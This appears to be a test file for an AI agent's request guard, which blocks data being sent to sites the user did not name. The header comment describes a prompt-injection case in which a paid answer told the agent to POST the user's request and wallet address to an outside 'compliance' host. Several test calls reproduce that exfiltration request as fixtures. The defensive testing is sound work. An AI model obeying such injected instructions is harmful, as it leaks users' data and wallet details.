// 0.20.13: data only to the sites the user named. Held-out set 1 (12 Nov 2026): a paid answer told the agent to POST the
// user's request and the paying wallet's address to a "compliance" host on another site; nothing was paid there, so
// sites (payments only) didn't stop it. createRequestGuard is the check; safeFetch applies it when sites is set.
import { test } from "node:test";
import assert from "node:assert/strict";
import { createSafeFetch, createRequestGuard } from "../index.js";

const SITES = ["https://api.ibanlens.example/v1/check?iban=NL91"];

test("a request that sends data to a site the user didn't name is refused; reading it, or sending to a named site, is not", () => {
  const check = createRequestGuard({ sites: SITES });
  const refused = (fn) => assert.throws(fn, (err) => {
    assert.equal(err.code, "other_site_data");
    assert.match(err.message, /confirm\.ibanlens-audit\.example is not on a site the user named/);
    return true;
  });
  refused(() => check("https://confirm.ibanlens-audit.example/v1/confirm", { method: "POST", body: "{\"request\":\"...\",\"wallet\":\"0x...\"}" }));
  refused(() => check("https://confirm.ibanlens-audit.example/v1/confirm", { method: "PUT" }));
  refused(() => check("https://confirm.ibanlens-audit.example/v1/confirm", { method: "delete" }));
  refused(() => check({ url: "https://confirm.ibanlens-audit.example/v1/confirm", method: "PATCH" }));
  assert.doesNotThrow(() => check("https://downloads.other.example/file.pdf"), "a plain GET elsewhere (a download) is fine");
  assert.doesNotThrow(() => check("https://downloads.other.example/file.pdf", { method: "HEAD" }));
  assert.doesNotThrow(() => check("https://status.ibanlens.example/v1/report", { method: "POST", body: "{}" }), "the same site, another host");
  assert.doesNotThrow(() => check("https://api.ibanlens.example/v1/check", { method: "POST", body: "" }), "an empty body to the named site");
});

test("createRequestGuard needs the sites", () => {
  for (const bad of [undefined, [], [""], [1], "api.example.com"]) assert.throws(() => createRequestGuard({ sites: bad }), /createRequestGuard needs sites/);
});

test("safeFetch with sites: a POST of data to another site is refused before anything leaves; a GET there goes through", async () => {
  const sent = [];
  const baseFetch = async (url, init) => {
    sent.push([String(url), init?.method ?? "GET"]);
    return Response.json({ ok: true });
  };
  const sf = createSafeFetch({ fetch: baseFetch, createPayingFetch: () => baseFetch, maxUsd: 0.05, sites: SITES });
  await assert.rejects(sf("https://confirm.ibanlens-audit.example/v1/confirm", { method: "POST", body: "{\"wallet\":\"0x1\"}" }), (err) => err.code === "other_site_data");
  assert.deepEqual(sent, [], "nothing was sent");
  assert.equal((await sf("https://downloads.other.example/file.pdf")).status, 200);
  assert.equal((await sf("https://api.ibanlens.example/v1/feedback", { method: "POST", body: "{}" })).status, 200);
  assert.deepEqual(sent.map(([u]) => new URL(u).host), ["downloads.other.example", "api.ibanlens.example"]);
});

test("without sites, nothing changes", async () => {
  const sf = createSafeFetch({ fetch: async () => Response.json({ ok: true }), createPayingFetch: () => fetch, maxUsd: 0.05 });
  assert.equal((await sf("https://confirm.ibanlens-audit.example/v1/confirm", { method: "POST", body: "{}" })).status, 200);
});
